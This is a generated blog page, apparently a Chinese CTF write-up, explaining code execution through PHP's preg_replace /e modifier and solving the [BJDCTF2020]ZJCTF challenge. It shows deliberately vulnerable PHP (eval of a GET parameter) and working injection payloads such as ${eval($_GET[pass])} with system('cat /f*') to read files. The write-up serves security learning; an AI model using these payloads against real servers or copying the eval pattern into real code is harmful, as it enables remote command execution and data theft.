@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="p0l1st">
+
+
+
+    <meta name="description" content="blog">
+
+
+
+<title>preg_replace /e模式下的代码执行 | p0l1st&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/b.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
+</head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">p0l1st&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">p0l1st&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">preg_replace /e模式下的代码执行</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">p0l1st</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 19, 2024&nbsp;&nbsp;22:56:33</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>案例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,$str）</span><br></pre></td></tr></table></figure>
+
+<h1 id="e模式"><a href="#e模式" class="headerlink" title="&#x2F;e模式"></a>&#x2F;e模式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($pattern,$replacement.$string)</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;e 修正符使preg_replace()将<strong>replacement</strong>参数当作PHP代码执行(确保replacement构成合法PHP代码字符串)。</p>
+<p>这里介绍一下preg_replace()的一些模式：</p>
+<ul>
+<li>&#x2F;g 表示该表达式用来在<strong>输入字符串中查找所有可能的匹配</strong>，返回的结果可以是<strong>多个</strong>。</li>
+<li>&#x2F;i 表示匹配的时候<strong>不区分大小写</strong></li>
+<li>&#x2F;m 表示<strong>多行匹配</strong>（匹配换行符两端的潜在匹配）</li>
+<li>&#x2F;s <strong>单行模式匹配</strong></li>
+<li>&#x2F;e <strong>可执行模式</strong></li>
+<li>&#x2F;x 忽<strong>略空白模式</strong></li>
+</ul>
+<h1 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br><span class="line"></span><br><span class="line">通俗来讲，就是\后面跟几，就匹配第几个。</span><br><span class="line">这里的\1就是指的是第一个子匹配项。</span><br></pre></td></tr></table></figure>
+
+<h1 id="exam"><a href="#exam" class="headerlink" title="exam"></a>exam</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>],<span class="string">&quot;jutst test&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>令h&#x3D;phpinfo()，那么代码就会被执行</p>
+<p>如果改为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/s*[php](.+?)[/php]s*/ies&quot;</span>, <span class="string">&#x27;test(&quot;\1&quot;)&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>h&#x3D;[php]phpinfo()[&#x2F;php]就不会被执行，因为经过正则匹配后，test(“\1”)就变为test(“phpinfo”)，此时php被当作字符串</p>
+<p>但是如果我们提交**h&#x3D;[php]{${phpinfo()}}[&#x2F;php]**，就能执行phpinfo，因为在php中，双引号中包含变量，php解释器会将其替换为变量解释后的结果，而单引号不会。</p>
+<p>所以如果**”test(‘\1’)”**就不会执行phpinfo</p>
+<h1 id="例题-BJDCTF2020-ZJCTF，不过如此"><a href="#例题-BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="例题[BJDCTF2020]ZJCTF，不过如此"></a>例题[BJDCTF2020]ZJCTF，不过如此</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的正则就变成:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27;S*)/ei&#x27;,&#x27;strtolower(&quot;phpinfo()&quot;)&#x27;,$str)</span><br></pre></td></tr></table></figure>
+
+<p>这里的\S意思是匹配所有字符，注意是大写S，大小写S是由区别的</p>
+<ul>
+<li>[\S]表示非空白就匹配</li>
+<li>[\s]表示出现空白就匹配</li>
+</ul>
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*=$&#123;eval($_GET[pass])&#125;&amp;pass=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/image-20240119223722075.png" alt="image-20240119223722075"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>p0l1st</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2024/01/19/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">http://example.com/2024/01/19/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/php-CTF/"># php CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/01/22/htaccess%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/">.htaccess奇淫技巧</a>
+            
+            
+            <a class="next" rel="next" href="/2024/01/14/2024%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98/">2024寒假刷题</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© p0l1st | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
